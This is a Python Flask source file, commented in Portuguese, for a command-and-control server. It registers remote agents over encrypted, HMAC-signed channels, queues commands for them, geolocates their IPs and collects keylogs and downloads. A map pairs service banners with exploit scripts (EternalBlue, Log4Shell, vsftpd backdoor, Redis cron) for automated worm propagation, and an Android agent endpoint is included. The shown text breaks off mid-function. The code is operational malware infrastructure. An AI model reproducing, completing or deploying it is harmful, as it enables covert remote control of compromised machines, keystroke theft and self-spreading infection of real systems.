import eventlet
eventlet.monkey_patch()
from pathlib import Path
import sqlite3
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory, Response
from flask_socketio import SocketIO
from datetime import datetime, timedelta
from database import init_db, get_db_connection, check_user_password
import uuid
import requests
import json
import os
import base64
import shutil
import time
import random
import socket
import threading
import hmac
import subprocess
import re
import shlex
import hashlib
import importlib.util
from flask import send_file
from functools import wraps
from collections import Counter
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from dotenv import load_dotenv
from gemini_module import call_gemini_api
from werkzeug.security import generate_password_hash

print("[INFO] Procurando pelo arquivo .env para carregar a chave da API...")
dotenv_path = os.path.join(os.path.dirname(__file__), '.env')
if os.path.exists(dotenv_path):
    load_dotenv(dotenv_path=dotenv_path)
    print("[INFO] Arquivo .env encontrado e carregado.")
else:
    print("[AVISO] Arquivo .env não encontrado. A análise por IA não funcionará.")

# --- PLATFORM-SPECIFIC IMPORTS ---
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import unpad
except ImportError:
    AES = None

# Inicializa o servidor Flask
app = Flask(__name__, template_folder='templates')
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# --- CONFIGURAÇÕES DE SEGURANÇA E AUTENTICAÇÃO ---
app.config['SECRET_KEY'] = os.urandom(24)
USERNAME = os.getenv("C2_USERNAME", "admin")
PASSWORD = os.getenv("C2_PASSWORD", "password")
# --- CHAVE PARA AUTENTICAÇÂO DOS AGENTES LEGITIMOS ---
#AGENT_SHARED_SECRET = os.getenv("AGENT_SHARED_SECRET", "mariaeuteamo")
AGENT_SHARED_SECRET_BYTES = os.getenv("AGENT_SHARED_SECRET", "mariaeuteamo").encode('utf-8')
C2_ACCESS_TOKEN = os.getenv("C2_ACCESS_TOKEN", "maria")
# --- ESTRUTURAS DE DADOS E PERSISTÊNCIA ---
#AGENTS_DB_FILE = "agents_db.json"
#TASKS_DB_FILE = "tasks_db.json"
#DOWNLOADS_DIR = "C2_Downloads"
#KEYLOGS_DIR = "C2_Keylogs"
#SYSTEM_LOGS_DIR = "C2_System_Logs"
OPERATOR_LOG_FILE = "c2_operator_log.txt"
BASE_DIR      = Path(__file__).parent
KEYLOGS_DIR     = BASE_DIR / 'keylogs'
SYSTEM_LOGS_DIR = BASE_DIR / 'system_logs'
DOWNLOADS_DIR = BASE_DIR / 'downloads'
PAYLOADS_DIR  = BASE_DIR / 'payloads'
EXPLOITS_DIR = Path(__file__).parent / 'exploits'
#agents = {}
#tasks = {}
AGENT_TIMEOUT_SECONDS = 60
IPGEOLOCATION_API_KEY = os.getenv("IPGEOLOCATION_API_KEY")

DASHBOARD_UPDATE_INTERVAL = 5  # Intervalo em segundos
last_dashboard_update_time = 0

# --- BANCO DE DADOS DE VULNERABILIDADES ---
# Mapeia uma string de "banner" (identificação do serviço) para o script de exploit correspondente.
VULN_MAP = {
    # Porta 21 — FTP
    "vsFTPd 2.3.4":           "vsftpd_234_backdoor.py",
    "vsftpd 2.3.4":           "vsftpd_234_backdoor.py",
 
    # Porta 445 — SMB / Windows
    "microsoft-ds":            "ms17_010_eternalblue.py",
    "netbios-ssn":             "ms17_010_eternalblue.py",
    "smb":                     "ms17_010_eternalblue.py",
 
    # Porta 6379 — Redis
    "redis":                   "redis_unauth_cron.py",
 
    # Porta 27017 — MongoDB
    "mongodb":                 "mongo_unauth.py",
    "mongod":                  "mongo_unauth.py",
 
    # Porta 8080 / 80 / 443 — HTTP Java (Log4Shell)
    "apache-coyote":           "log4shell.py",
    "spring":                  "log4shell.py",
    "log4j":                   "log4shell.py",
    "jetty":                   "log4shell.py",
    "jboss":                   "log4shell.py",
    "tomcat":                  "log4shell.py",
 
    # Legados (manter compatibilidade)
    "Welcome to Vulnerable Server!": "vulnserver_trun.py",
}

key_buffer = []  
buffer_lock = threading.Lock()
last_window_title = ""
# --- Chave AES-256 ---#
try:
    C2_AES_KEY_B64 = os.getenv("C2_AES_KEY_B64")
    C2_AES_KEY = base64.b64decode(C2_AES_KEY_B64)
    if len(C2_AES_KEY) != 32:
        raise ValueError("A chave AES do .env precisa ter 32 bytes (codificada em Base64).")
except Exception as e:
    print(f"[CRÍTICO] Erro ao carregar a chave AES do arquivo .env: {e}")
    C2_AES_KEY = get_random_bytes(32)
    print(f"[AVISO] Usando uma chave AES temporária e volátil. A comunicação com agentes existentes falhará.")
    print(f"[INFO] Chave temporária (Base64): {base64.b64encode(C2_AES_KEY).decode('utf-8')}")

# Função de Verificação dos agentes Legítimos ---
#def agent_traffic_only(f):
#    """
#    Decorator atualizado para lidar com agentes novos (com token) e antigos (sem token).
#    """
#    @wraps(f)
#    def decorated_function(*args, **kwargs):
#        token = request.headers.get('X-Gemini-Token')##
#
#        # CASO 1: Agente novo e seguro
#        if token and token == AGENT_SHARED_SECRET:
#            # O token está correto, permite a passagem.
#            return f(*args, **kwargs)
#
#       # CASO 2: Um pedido sem token (agente antigo ou scanner)
#        if not token:
#            # AVISO DE OPSEC: Esta linha permite que agentes antigos se conectem,
#            # mas também expõe o seu C2 a scanners.
#            print(f"[AVISO DE OPSEC] Recebido pedido sem token de agente de {request.remote_addr}. A permitir por compatibilidade com versões antigas.")
#            return f(*args, **kwargs)

        # CASO 3: Um pedido com o token ERRADO. Bloqueia sempre.
        # Isto impede que alguém que encontrou o seu C2 tente adivinhar o token.
#        return jsonify({"error": "Não encontrado"}), 404
#    return decorated_function

def hmac_required(f):
    """
    Decorator que valida a assinatura HMAC de uma requisição para autenticar o agente.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # 1. Pega os headers de autenticação enviados pelo agente
        req_timestamp_str = request.headers.get('X-Request-Timestamp')
        req_signature = request.headers.get('X-Signature')

        # Se os headers não existirem, a requisição é inválida.
        if not req_timestamp_str or not req_signature:
            print(f"[AUTH-FAIL] Requisição de {request.remote_addr} sem headers de autenticação. Descartando.")
            return jsonify({"error": "Não autorizado"}), 403

        # 2. Valida o timestamp para prevenir que um invasor capture e reenvie um pacote antigo (Replay Attack)
        try:
            req_timestamp = int(req_timestamp_str)
            current_timestamp = int(time.time())
            # Permite uma janela de 5 minutos (300 segundos) de diferença de tempo
            if abs(current_timestamp - req_timestamp) > 300:
                print(f"[AUTH-FAIL] Requisição de {request.remote_addr} com timestamp expirado. Descartando.")
                return jsonify({"error": "Não autorizado"}), 403
        except ValueError:
            return jsonify({"error": "Timestamp inválido"}), 400

        # 3. Recalcula a assinatura no lado do servidor para ver se ela bate
        # Para requisições POST, o corpo (request.data) faz parte da assinatura.
        # Para requisições GET, o corpo está vazio.
        payload_bytes = request.data if request.method in ['POST', 'PUT'] else b''
        
        # O cálculo deve ser EXATAMENTE o mesmo que o agente fez
        message_to_sign = req_timestamp_str.encode('utf-8') + payload_bytes
        server_signature = hmac.new(AGENT_SHARED_SECRET_BYTES, message_to_sign, hashlib.sha256).hexdigest()

        # 4. Compara as assinaturas de forma segura (evita timing attacks)
        if hmac.compare_digest(server_signature, req_signature):
            # SUCESSO! A assinatura bate. A requisição é legítima.
            return f(*args, **kwargs)
        else:
            # FALHA! A assinatura não bate. A requisição é falsa ou foi adulterada.
            print(f"[AUTH-FAIL] Requisição de {request.remote_addr} com assinatura HMAC inválida. Descartando.")
            return jsonify({"error": "Não autorizado"}), 403
            
    return decorated_function

def role_required(allowed_roles):
    """
    Decorator que verifica se a role do usuário na sessão está na lista de roles permitidas.
    """
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            # Se o usuário não estiver logado, o @login_required já o terá redirecionado.
            # Mas adicionamos uma checagem extra por segurança.
            if 'role' not in session:
                return jsonify({"error": "Acesso negado. Nenhuma função de usuário encontrada na sessão."}), 403
            
            user_role = session.get('role')
            
            # Verifica se a função do usuário está na lista de funções permitidas para esta rota.
            if user_role not in allowed_roles:
                # Loga a tentativa de acesso não autorizado para auditoria.
                log_system_event(
                    session.get('username'), 
                    "ACCESS_DENIED", 
                    f"Tentativa de acesso à rota restrita. Role necessária: {allowed_roles}, Role do usuário: {user_role}"
                )
                return jsonify({"error": "Acesso negado. Você não tem permissão para executar esta ação."}), 403
            
            # Se a permissão estiver correta, executa a função da rota normalmente.
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# --- FUNÇÕES DE AJUDA (CÓDIGO ESTÁVEL v2.2) ---
def setup_directories():
    os.makedirs(DOWNLOADS_DIR, exist_ok=True)
    os.makedirs(KEYLOGS_DIR, exist_ok=True)
    os.makedirs(SYSTEM_LOGS_DIR, exist_ok=True)

#def save_agents_to_disk():
#    with open(AGENTS_DB_FILE, 'w') as f:
#        json.dump(agents, f, indent=4)

#def load_agents_from_disk():
#    global agents
#    if os.path.exists(AGENTS_DB_FILE) and os.path.getsize(AGENTS_DB_FILE) > 0:
#        try:
#            with open(AGENTS_DB_FILE, 'r') as f:
#                agents = json.load(f)
#                print(f"[+] {len(agents)} agentes carregados do banco de dados.")
#        except:
#            agents = {}
#    else:
#        agents = {}

#def save_tasks_to_disk():
#    try:
#        with open(TASKS_DB_FILE, 'w') as f:
#            json.dump(tasks, f, indent=4)
#    except Exception as e:
#        # É uma boa prática logar erros de IO
#        print(f"[ERRO] Falha ao salvar tasks no disco: {e}")

#def load_tasks_from_disk():
#    global tasks
#    if os.path.exists(TASKS_DB_FILE) and os.path.getsize(TASKS_DB_FILE) > 0:
#        try:
#            with open(TASKS_DB_FILE, 'r') as f:
#                tasks = json.load(f)
#                print(f"[+] Tarefas de {len(tasks)} agentes carregadas do banco de dados.")
#        except Exception as e:
#            print(f"[ERRO] Falha ao carregar tasks, iniciando com DB vazio: {e}")
#            tasks = {}
#    else:
#        tasks = {}
def log_operator_action(agent_id, command, args):
    with open(OPERATOR_LOG_FILE, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] AGENT_ID: {agent_id} | COMMAND: {command} | ARGS: {json.dumps(args)}\n"
        f.write(log_entry)

@app.route('/portfolio')
def portfolio_page():
    """
    Rota pÃºblica que exibe a pÃ¡gina de portfÃ³lio do projeto.
    """
    return render_template('portfolio.html')


def log_system_event(agent_id, event_type, message):
    """Salva um evento de sistema no banco de dados e emite um evento WebSocket."""
    log_entry_text = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{event_type.upper()}] {str(message)}"
    
    # --- INÍCIO DA MIGRAÇÃO SQL ---
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO system_logs (agent_id, event_type, message, timestamp) VALUES (?, ?, ?, ?)",
            (agent_id, event_type.upper(), str(message), datetime.now().isoformat())
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"[ERRO DB] Falha ao salvar log de sistema no banco de dados: {e}")
    # --- FIM DA MIGRAÇÃO SQL ---

    # A notificação para o painel continua a mesma, enviando o texto formatado
    socketio.emit('new_system_log', {'agent_id': agent_id, 'log_entry': log_entry_text})


# --- Função de Criptografia --- #
def encrypt_data(plaintext_data: str, key: bytes) -> str:
    """Criptografa dados (str) usando AES-GCM e retorna Base64 (str)."""
    try:
        header = b"GEMINI_C2_DATA" # Header para checagem de sanidade
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext_data.encode('utf-8'))

        # Estrutura: header(14) + nonce(16) + tag(16) + ciphertext
        encrypted_payload = header + cipher.nonce + tag + ciphertext
        return base64.b64encode(encrypted_payload).decode('utf-8')
    except Exception as e:
        # No agente.py, isso vai logar no arquivo. No servidor, vai dar print.
        try:
            write_internal_log(f"Erro ao criptografar: {e}")
        except NameError:
            print(f"[ERRO] Erro ao criptografar: {e}")
        return ""

def decrypt_data(base64_data: bytes, key: bytes) -> str:
    """Decriptografa Base64 (bytes) usando AES-GCM e retorna (str)."""
    try:
        encrypted_payload = base64.b64decode(base64_data)

        # Checagem de sanidade do header
        if not encrypted_payload.startswith(b"GEMINI_C2_DATA"):
            raise ValueError("Payload inválido ou corrompido (header incorreto)")

        # Desmonta o payload: header(14) + nonce(16) + tag(16) + ciphertext
        header_len = 14
        nonce_len = 16
        tag_len = 16

        nonce = encrypted_payload[header_len : header_len + nonce_len]
        tag = encrypted_payload[header_len + nonce_len : header_len + nonce_len + tag_len]
        ciphertext = encrypted_payload[header_len + nonce_len + tag_len :]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_data.decode('utf-8')
    except (ValueError, KeyError, base64.binascii.Error) as e:
        try:
            write_internal_log(f"Erro ao decriptografar: {e}")
        except NameError:
            print(f"[ERRO] Erro ao decriptografar: {e}")
        return ""



GEO_CACHE_TTL_SECONDS = 30 * 24 * 3600  # 30 dias

def resolve_geo(ip):
    """
    Consulta ipgeolocation.io e retorna dict: {latitude, longitude, city, country}
    (Versão v2 - sem cache, para migração SQL)
    """
    if not ip or not IPGEOLOCATION_API_KEY:
        return None

    # Ignora IPs privados/locais para não gastar chamadas de API
    if any(ip.startswith(p) for p in ["192.168.", "10.", "172.", "127."]):
        return None

    try:
        url = f"https://api.ipgeolocation.io/ipgeo?apiKey={IPGEOLOCATION_API_KEY}&ip={ip}"
        resp = requests.get(url, timeout=5 )
        
        if resp.status_code != 200:
            print(f"[WARN] IPGeo API retornou {resp.status_code} para o IP {ip}")
            return None

        js = resp.json()
        lat = float(js.get('latitude')) if js.get('latitude') else None
        lon = float(js.get('longitude')) if js.get('longitude') else None

        if lat is None or lon is None:
            return None

        return {
            "latitude": lat,
            "longitude": lon,
            "city": js.get('city') or None,
            "country": js.get('country_name') or None
        }
    except Exception as e:
        print(f"[WARN] Erro ao resolver geo para {ip}: {e}")
        return None



def trigger_dashboard_update():
    """
    Função "inteligente" que só emite a atualização do dashboard se já tiverem
    passado X segundos desde a última atualização, evitando spam de eventos.
    """
    global last_dashboard_update_time
    now = time.time()
    if now - last_dashboard_update_time > DASHBOARD_UPDATE_INTERVAL:
        print("[INFO] Disparando atualização do dashboard (via trigger)...")
        socketio.emit('dashboard_update', get_dashboard_data_logic())
        last_dashboard_update_time = now


# --- DECORATOR DE AUTENTICAÇÃO ---
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            # Rotas de API retornam JSON, não redirect
            if request.path.startswith('/api/'):
                return jsonify({"error": "Não autenticado."}), 401
            return redirect(url_for('login_route'))
        return f(*args, **kwargs)
    return decorated_function


# --- ROTAS DE AUTENTICAÇÃO E PAINEL ---
@app.route('/login', methods=['GET', 'POST'])
def login_route():
    # Se o usuário já estiver logado, redireciona para a home para evitar confusão
    if 'logged_in' in session:
        return redirect(url_for('home'))

    if request.method == 'POST':
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "Payload inválido."}), 400

        username = data.get('username')
        password = data.get('password')

        
        # função que consulta o banco de dados e verifica o hash da senha.
        user = check_user_password(username, password)

        

        if user:
            # armazena as informações do usuário na sessão do navegador.
            session['logged_in'] = True
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['role'] = user['role']


            print("\n" + "="*50)
            print(f"[DEBUG LOGIN SUCESSO] Usuário '{user['username']}' autenticado.")
            print(f"[DEBUG LOGIN SUCESSO] Salvando na sessão: role = '{session['role']}'")
            print("="*50 + "\n")
            
            # auditoria
            log_system_event(user['username'], "LOGIN_SUCCESS", f"Operador '{user['username']}' logado com sucesso.")
            
            return jsonify({"status": "success"})
        else:
            # FALHA: A função check_user_password retornou None.
            # Loga a tentativa de falha para auditoria de segurança.
            log_system_event(username or "desconhecido", "LOGIN_FAIL", f"Tentativa de login falhou para o usuário '{username or 'vazio'}'.")
            
            return jsonify({"status": "error", "message": "Credenciais inválidas."}), 401

    # Se for um método GET, apenas renderiza a página de login.
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login_route'))

@app.route('/')
def home():
    # --- LÓGICA DE ACESSO UNIFICADA E CORRIGIDA ---

    # CENÁRIO 1: O usuário já está logado (tem uma sessão ativa).
    if 'logged_in' in session and session.get('logged_in'):
        
        # LOG DE DEBUG PARA CONFIRMAR QUE ESTAMOS NO CAMINHO CERTO
        print("\n" + "="*50)
        print(f"[DEBUG ROTA /] Acesso via SESSÃO ATIVA.")
        print(f"[DEBUG ROTA /] Lendo 'role' da sessão: '{session.get('role')}'")
        print("="*50 + "\n")

        # Pega a role da sessão, com um fallback seguro para 'Observer'.
        user_role = session.get('role', 'Observer')
        
        # Lógica para detectar se é um dispositivo móvel
        user_agent = request.headers.get('User-Agent', '').lower()
        mobile_keywords = ['iphone', 'android', 'webos', 'ipad', 'ipod', 'blackberry', 'windows phone']
        is_mobile = any(keyword in user_agent for keyword in mobile_keywords)

        # Renderiza o template correto, MAS AGORA SEMPRE PASSANDO A 'user_role'.
        if is_mobile:
            # Mesmo que seja mobile, passamos a role (pode ser útil no futuro)
            return render_template('mobile.html', user_role=user_role)
        else:
            # Este é o fluxo principal para o painel desktop
            return render_template('panel.html', user_role=user_role)

    # CENÁRIO 2: O usuário NÃO está logado, mas está tentando acessar com o token.
    provided_token = request.args.get('token')
    if provided_token == C2_ACCESS_TOKEN:
        # O token está correto, mostra a página de login para que ele possa criar uma sessão.
        return render_template('login.html')
    
    # CENÁRIO 3: O usuário não está logado E não tem o token correto.
    return render_template('unauthorized.html'), 403


@app.route('/admin/users')
@login_required
@role_required(['Administrator']) # Apenas Administradores podem ver esta página
def admin_users_page():
    """Renderiza a página de gerenciamento de usuários."""
    try:
        conn = get_db_connection()
        # Busca todos os usuários, exceto a senha, para exibir na tabela
        users = conn.execute("SELECT id, username, role, created_at FROM users ORDER BY id").fetchall()
        conn.close()
        # Renderiza o novo template que você criará
        return render_template('admin_users.html', users=users, current_user_id=session.get('user_id'))
    except Exception as e:
        print(f"[ERRO] Falha ao carregar a página de gerenciamento de usuários: {e}")
        return "Erro interno ao carregar a página.", 500

@app.route('/api/users', methods=['POST'])
@login_required
@role_required(['Administrator']) # Apenas Administradores podem criar usuários
def add_user_api():
    """API para adicionar um novo usuário."""
    try:
        data = request.json
        username = data.get('username')
        password = data.get('password')
        role = data.get('role')

        if not all([username, password, role]):
            return jsonify({"status": "error", "message": "Nome de usuário, senha e função são obrigatórios."}), 400
        
        if role not in ['Administrator', 'Operator', 'Observer']:
            return jsonify({"status": "error", "message": "Função inválida."}), 400

        conn = get_db_connection()
        # Verifica se o usuário já existe
        if conn.execute("SELECT id FROM users WHERE username = ?", (username,)).fetchone():
            conn.close()
            return jsonify({"status": "error", "message": "Este nome de usuário já está em uso."}), 409

        
        password_hash = generate_password_hash(password)
        
        conn.execute(
            "INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
            (username, password_hash, role, datetime.now().isoformat())
        )
        conn.commit()
        conn.close()
        
        log_system_event(session.get('username'), "USER_CREATED", f"Usuário '{username}' criado com a função '{role}'.")
        return jsonify({"status": "success", "message": f"Usuário '{username}' criado com sucesso."})

    except Exception as e:
        print(f"[ERRO] Falha na API de adicionar usuário: {e}")
        return jsonify({"status": "error", "message": "Erro interno no servidor."}), 500

@app.route('/api/users/<int:user_id>', methods=['DELETE'])
@login_required
@role_required(['Administrator']) # Apenas Administradores podem deletar usuários
def delete_user_api(user_id):
    """API para deletar um usuário."""
    try:
        # Medida de segurança: um administrador não pode deletar a si mesmo.
        if user_id == session.get('user_id'):
            return jsonify({"status": "error", "message": "Você não pode deletar sua própria conta."}), 403

        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Pega o nome de usuário antes de deletar, para o log
        user_to_delete = cursor.execute("SELECT username FROM users WHERE id = ?", (user_id,)).fetchone()
        if not user_to_delete:
            conn.close()
            return jsonify({"status": "error", "message": "Usuário não encontrado."}), 404
        
        username_deleted = user_to_delete['username']

        cursor.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        
        log_system_event(session.get('username'), "USER_DELETED", f"Usuário '{username_deleted}' (ID: {user_id}) foi deletado.")
        return jsonify({"status": "success", "message": "Usuário deletado com sucesso."})

    except Exception as e:
        print(f"[ERRO] Falha na API de deletar usuário: {e}")
        return jsonify({"status": "error", "message": "Erro interno no servidor."}), 500


@app.route('/register_mobile', methods=['POST'])
def register_mobile_agent():
    """
    Endpoint de registo simplificado para o agente Android, AGORA USANDO O BANCO DE DADOS.
    """
    try:
        data = request.json
        if not data:
            return jsonify({"error": "Payload JSON inválido ou vazio."}), 400

        agent_id = str(uuid.uuid4())
        
        # Usa o IP real da requisição
        external_ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr

        # Conecta ao banco de dados
        conn = get_db_connection()
        cursor = conn.cursor()

        # Prepara os dados para inserção no banco
        agent_data = {
            "id": agent_id,
            "hostname": data.get("hostname", "Dispositivo Android"),
            "username": data.get("username", "Utilizador Android"),
            "internal_ip": "N/A (Mobile)",
            "external_ip": external_ip,
            "os_name": data.get("os_name", "Android"),
            "privileges": "User",
            "agent_version": data.get("agent_version", "1.0-Android"),
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "status": "online",
            "geo_latitude": None,
            "geo_longitude": None,
            "geo_city": None,
            "geo_country": None,
            "geo_last_checked": None
        }
        
        # Tenta obter a geolocalização e atualiza os dados se conseguir
        geo = resolve_geo(external_ip)
        if geo:
            agent_data.update({
                "geo_latitude": geo.get("latitude"),
                "geo_longitude": geo.get("longitude"),
                "geo_city": geo.get("city"),
                "geo_country": geo.get("country"),
                "geo_last_checked": int(time.time())
            })

        # Insere o novo agente no banco de dados
        cursor.execute("""
            INSERT INTO agents (id, username, hostname, internal_ip, external_ip, os_name, privileges, agent_version, first_seen, last_seen, status, geo_latitude, geo_longitude, geo_city, geo_country, geo_last_checked)
            VALUES (:id, :username, :hostname, :internal_ip, :external_ip, :os_name, :privileges, :agent_version, :first_seen, :last_seen, :status, :geo_latitude, :geo_longitude, :geo_city, :geo_country, :geo_last_checked)
        """, agent_data)
        
        conn.commit()
        conn.close()

        # Log e notificação (essas funções já usam o DB, então estão corretas)
        log_system_event(agent_id, "REGISTER", f"Novo agente Android registado. Versão: {agent_data['agent_version']}")
        socketio.emit('agent_list_update', get_agents_with_status())

        # Retorna o ID do agente para o app Android
        return jsonify({"agent_id": agent_id})

    except Exception as e:
        # Este print agora vai mostrar um erro muito mais útil se algo der errado
        print(f"[ERRO] Falha no endpoint /register_mobile: {e}")
        import traceback
        traceback.print_exc() # Imprime o traceback completo do erro
        return jsonify({"error": "Erro interno no servidor ao registar agente mobile."}), 500



# --- API PARA AGENTES (Não requerem login) ---
@app.route('/register', methods=['POST'])
@hmac_required
#@agent_traffic_only
def register_agent():
    encrypted_data = request.data
    decrypted_json_str = decrypt_data(encrypted_data, C2_AES_KEY)

    if not decrypted_json_str:
        print("[ERRO] Falha ao decriptografar payload de registro.")
        return jsonify({"error": "Falha na decriptografia"}), 400

    data = json.loads(decrypted_json_str)
    agent_id = str(uuid.uuid4())
    
    conn = get_db_connection()
    cursor = conn.cursor()

    # Prepara os dados com valores PADRÃO (None ou N/A)
    agent_data = {
        "id": agent_id,
        "username": data.get("username"),
        "hostname": data.get("hostname"),
        "internal_ip": data.get("internal_ip", "N/A"),
        "external_ip": data.get("external_ip", "N/A"),
        "os_name": data.get("os_name"),
        "privileges": data.get("privileges", "Desconhecido"),
        "agent_version": data.get("agent_version", "2.2"),
        "first_seen": datetime.now().isoformat(),
        "last_seen": datetime.now().isoformat(),
        "status": "online",
        # --- CORREÇÃO: Inicializa os campos geo com None ---
        "geo_latitude": None,
        "geo_longitude": None,
        "geo_city": None,
        "geo_country": None,
        "geo_last_checked": None
    }

    # Tenta obter a geolocalização
    geo = resolve_geo(agent_data["external_ip"])
    if geo:
        # Se a geolocalização for bem-sucedida, ATUALIZA os valores
        agent_data["geo_latitude"] = geo.get("latitude")
        agent_data["geo_longitude"] = geo.get("longitude")
        agent_data["geo_city"] = geo.get("city")
        agent_data["geo_country"] = geo.get("country")
        agent_data["geo_last_checked"] = int(time.time())

    # Agora, o comando INSERT sempre terá valores para todos os campos,
    # mesmo que sejam None, evitando o ProgrammingError.
    cursor.execute("""
        INSERT INTO agents (id, username, hostname, internal_ip, external_ip, os_name, privileges, agent_version, first_seen, last_seen, status, geo_latitude, geo_longitude, geo_city, geo_country, geo_last_checked)
        VALUES (:id, :username, :hostname, :internal_ip, :external_ip, :os_name, :privileges, :agent_version, :first_seen, :last_seen, :status, :geo_latitude, :geo_longitude, :geo_city, :geo_country, :geo_last_checked)
    """, agent_data)
    
    conn.commit()
    conn.close()

    log_system_event(agent_id, "REGISTER", f"Novo agente registrado (CRIPTOGRAFADO). Versão: {agent_data['agent_version']}")
    
    socketio.emit('agent_list_update', get_agents_with_status())

    response_json = json.dumps({"agent_id": agent_id})
    encrypted_response = encrypt_data(response_json, C2_AES_KEY)
    return app.response_class(encrypted_response, mimetype='text/plain')



@app.route('/get_task/<agent_id>', methods=['GET'])
@hmac_required
#@agent_traffic_only
def get_task(agent_id):
    # --- PARTE 1: ATUALIZAÇÃO DO AGENTE (JÁ MIGRAdo) ---
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("SELECT external_ip, geo_last_checked FROM agents WHERE id = ?", (agent_id,))
    agent_row = cursor.fetchone()

    if not agent_row:
        conn.close()
        err_json = json.dumps({"error": "Agente não registrado"})
        return app.response_class(encrypt_data(err_json, C2_AES_KEY), mimetype='text/plain'), 404

    cursor.execute("UPDATE agents SET last_seen = ? WHERE id = ?", (datetime.now().isoformat(), agent_id))
    conn.commit()

    try:
        ext_ip = agent_row['external_ip']
        last_checked = agent_row['geo_last_checked'] or 0
        if ext_ip and not any(ext_ip.startswith(p) for p in ["192.168.", "10.", "172.", "127."]):
            if (time.time() - last_checked) > GEO_CACHE_TTL_SECONDS:
                new_geo = resolve_geo(ext_ip)
                if new_geo:
                    cursor.execute("""
                        UPDATE agents 
                        SET geo_latitude = ?, geo_longitude = ?, geo_city = ?, geo_country = ?, geo_last_checked = ?
                        WHERE id = ?
                    """, (
                        new_geo.get('latitude'), new_geo.get('longitude'), new_geo.get('city'),
                        new_geo.get('country'), int(time.time()), agent_id
                    ))
                    conn.commit()
    except Exception as e:
        print(f"[WARN] Falha ao atualizar geo no get_task para {agent_id}: {e}")

    # --- PARTE 2: BUSCA DE TAREFAS (NOVA MIGRAÇÃO) ---
    task_to_send = None
    try:
        # 1. Busca a primeira tarefa com status 'Pendente' para este agente
        cursor.execute(
            "SELECT id, command, args FROM tasks WHERE agent_id = ? AND status = 'pendente' ORDER BY timestamp_issued ASC LIMIT 1",
            (agent_id,)
        )
        task_row = cursor.fetchone()

        if task_row:
            # 2. Se uma tarefa foi encontrada, atualiza seu status para 'Executando'
            task_id = task_row['id']
            cursor.execute("UPDATE tasks SET status = 'executando' WHERE id = ?", (task_id,))
            conn.commit()
            
            # Prepara a tarefa para ser enviada ao agente
            args_val = task_row['args']
            try:
                # Tenta decodificar se for um JSON, senão usa como está
                args_parsed = json.loads(args_val) if args_val and (args_val.startswith('{') or args_val.startswith('[')) else args_val
            except (json.JSONDecodeError, TypeError):
                args_parsed = args_val

            task_to_send = {"task_id": task_id, "command": task_row['command'], "args": args_parsed}
        else:
            # 3. Se nenhuma tarefa foi encontrada, envia 'sleep'
            task_to_send = {"command": "sleep", "args": "5"}
    except Exception as e:
        print(f"[ERRO DB] Falha ao buscar tarefa para o agente {agent_id}: {e}")
        task_to_send = {"command": "sleep", "args": "15"} # Sleep mais longo em caso de erro de DB
    finally:
        # Garante que a conexão seja fechada
        conn.close()

    # --- PARTE 3: NOTIFICAÇÃO E RESPOSTA (LÓGICA ANTIGA REMOVIDA) ---
    # A notificação para o painel agora é feita de forma mais limpa
    socketio.emit('agent_list_update', get_agents_with_status())
    
    # A parte de criptografia e envio permanece a mesma
    payload_json = json.dumps(task_to_send)
    encrypted_payload = encrypt_data(payload_json, C2_AES_KEY)
    return app.response_class(encrypted_payload, mimetype='text/plain')


@app.route('/task_result', methods=['POST'])
@hmac_required
#@agent_traffic_only
def post_result():
    print(f"\n[DIAGNOSTICO-SERVIDOR] Rota /task_result foi atingida às {datetime.now()}")
    """
    Processa o resultado de uma tarefa enviada por um agente.
    Versão v3.1 - Robusta, com status padronizado e notificações síncronas.
    """
    try:
        # 1. Descriptografa o payload
        encrypted_data = request.data
        decrypted_json_str = decrypt_data(encrypted_data, C2_AES_KEY)
        if not decrypted_json_str:
            print("[ERRO] Falha ao decriptografar payload de resultado.")
            return jsonify({"error": "Falha na decriptografia"}), 400
        data = json.loads(decrypted_json_str)


        print(f"[DIAGNOSTICO-SERVIDOR] Dados recebidos e decriptografados: {data}")

        # 2. Extrai os dados
        agent_id = data.get('agent_id')
        task_id = data.get('task_id')
        data_type = data.get('data_type', 'generic_result')
        result_data = data.get('result')

        if not agent_id or not task_id:
            return jsonify({"error": "Payload de resultado incompleto."}), 400

        # --- INÍCIO DAS CORREÇÕES E MELHORIAS ---
        
        # 3. Atualiza a tarefa no banco de dados
        conn = get_db_connection()
        cursor = conn.cursor()

        # Padroniza o status para minúsculo para consistência
        new_status_db = 'concluido' if data_type != 'error' else 'erro'
        result_str = json.dumps(result_data) if isinstance(result_data, (dict, list)) else str(result_data)
        
        cursor.execute(
            "UPDATE tasks SET status = ?, result = ?, data_type = ? WHERE id = ?",
            (new_status_db, result_str, data_type, task_id)
        )
        conn.commit()

        if data_type in ["WORM_LOG", "WORM_VULN"]:
            # Se for um log do worm, emite um evento WebSocket específico para o painel.
            socketio.emit('worm_activity_log', {
                'agent_id': agent_id,
                'log_level': data_type, # WORM_LOG ou WORM_VULN
                'message': result_data
